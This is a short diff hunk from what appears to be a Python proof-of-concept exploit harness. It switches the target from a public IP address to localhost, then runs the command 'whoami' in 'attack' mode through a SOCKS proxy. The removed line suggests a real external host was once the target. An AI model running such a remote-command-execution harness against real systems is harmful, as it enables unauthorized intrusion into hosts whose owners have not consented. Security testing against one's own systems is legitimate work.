@@ -68,6 +68,6 @@ if __name__ == '__main__':
     os.environ.setdefault('http', 'socks5://127.0.0.1:10000')
     poc = Poc()
     logger.setLevel(level='DEBUG')
-    poc.set_option('url', 'http://120.133.73.71:800')
+    poc.set_option('url', 'http://127.0.0.1:800')
     poc.set_option('command', 'whoami')
     poc.execute(mode='attack')
